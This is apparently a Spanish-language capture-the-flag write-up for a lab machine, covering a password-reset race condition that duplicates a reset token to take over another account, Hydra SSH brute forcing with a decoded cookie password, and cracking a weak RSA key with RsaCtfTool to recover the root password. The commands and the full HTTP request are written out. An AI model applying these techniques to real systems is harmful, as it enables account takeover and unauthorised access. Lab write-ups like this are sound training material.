## Reconocimiento:

Puerto 22 : SSH

Puerto 80 : HTTP

En la web hay un portal de acceso con un sistema de autenticación segura con:

- Autenticación multi-factor.
- Gestión segura de contraseñas.
- Tokens de recuperación temporales.
- Monitoreo de actividad en tiempo real.

Por el nombre de la máquina interesa investigar los tokens.

Hay expuestas las credenciales de dos usuarios; Uno tiene permisos limitados (diseo) y el otro no revela la contraseña (Es al que interesa acceder) :

```bash
# Usuario limitado:
User : diseo
Pass : hacker

#Usuario interesante:
User : victim
```

Hay una opción para cambiar la contraseña que genera un URL con un token valido basado en 10 minutos. 

La técnica que se aplica aquí se llama Race Condition. 

Toca capturar la petición mandada al querer cambiar la contraseña y enviarla doble, una al usuario “victim” y otra al usuario “diseo”. Así existe la posibilidad de generar el mismo token para dos usuarios, pudiendo cambiar la contraseña de victim.

Primero intercepto la petición POST de “enviar enlace de recueperación”, la envío 3 veces al Repeater poniendo la 1 y la 2 en un grupo y configurando el envio en paralelo. 

En la tercera la edito para que genere nuevas cookies, quedaría así:

```
POST /forgot-password.php HTTP/1.1
Host: 172.17.0.2
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 84
Origin: http://172.17.0.2
DNT: 1
Connection: keep-alive
Referer: http://172.17.0.2/forgot-password.php
Cookie: 
Upgrade-Insecure-Requests: 1
Priority: u=0, i

csrf=&username=
```

Al enviarla genera nuevo PHPSESSIONID y csrf. Valores que intercambiamos en la petición 2 y en la petición 1 modifico el username a victim. Y enviamos el grupo. 

Volviendo al panel debería de haber una notificación con un enlace para cambiar la contraseña:

```
http://172.17.0.2//reset-password.php?token=TOKEN&username=diseo
```

Pero si el token se duplicó de manera exitosa podemos cambiar el parámetro “diseo” por “vicitim” y cambiar la contraseña.

Listo, entramos como victim con la contraseña nueva.

En la sección de cookies se genera un “admin_token”, intento decodificarlo:

```bash
echo 'UEBzc3cwcmQhVXNlcjRkbTFuMjAyNSEjLQ==' | base64 -d
P@ssw0rd!User4dm1n2025!#-
```

Teniendo en cuenta que es una contraseña y que hay SSH, creo una lista de posibles usuarios para un ataque con hydra.

```bash
# nano users.txt
victim
diseo
admin
```

```bash
hydra -L users.txt -p 'P@ssw0rd!User4dm1n2025!#-' ssh://172.17.0.2 -t 64 -I
```

User : admin

Pass : P@ssw0rd!User4dm1n2025!#-

## Escalada:

```bash
ls -la
```

Interesa la carpeta /.mail

```bash
ls 
mail.txt password.enc public.key
```

En el archivo mail.txt nos da a entender que el archivo password.enc esta cifrado por RSA.

Toca romper el cifrado.

Primero necesitamos extraer el modulo “n” y el exponente “e”.

```bash
openssl rsa -pubin -in public.key -text -noout
```

Info:

```bash
n = d695d37d7fbfcfc49d47e5466aba333012c305f60f57fa8704b7cc4bc575661a47
```

```bash
e = 65537
```

Usare una herramientas que encontré en Github:

https://github.com/RsaCtfTool/RsaCtfTool

```bash
python3 -m venv venv
source venv/bin/activate
pip install git+https://github.com/RsaCtfTool/RsaCtfTool
```

Toca romper el RSA (factorizar n)

```bash
RsaCtfTool \
-n 0xd695d37d7fbfcfc49d47e5466aba333012c305f60f57fa8704b7cc4bc575661a47 \
-e 65537 \
--private
```

Info:

```bash
-----BEGIN RSA PRIVATE KEY-----
MIGvAgEAAiIA1pXTfX+/z8SdR+VGarozMBLDBfYPV/qHBLfMS8V1ZhpHAgMBAAEC
IgCxXeITx7Yp69/8/zv3F7UbnKWR5r51YFKUlkYHMVCYXiECEQwvOe6dZ9SIYw7U
8TdWdlPZAhERnIJGmYy41j1uDPtXcZCrHwIRAJeKyPz8vmah6WaPEZExzoECEQga
q2BtnHIaNF6GHssYeWglAhEIkhGfgN+qneYoKgcSTrC/fw==
-----END RSA PRIVATE KEY-----
```

El resultado lo copiamos y pegamos en un archivo creado en el directorio /tmp llamado private.key

Le damos permisos:

```bash
chmod 600 private.key
```

Volvemos a /home/admin/.mail y procedemos a descifrar el contenido de “password.enc”:

```bash
openssl rsautl -decrypt -inkey /tmp/private.key -in password.enc
#Info:
P@ssw0rd!2025
```

Listo, esa sería la contraseña de root.
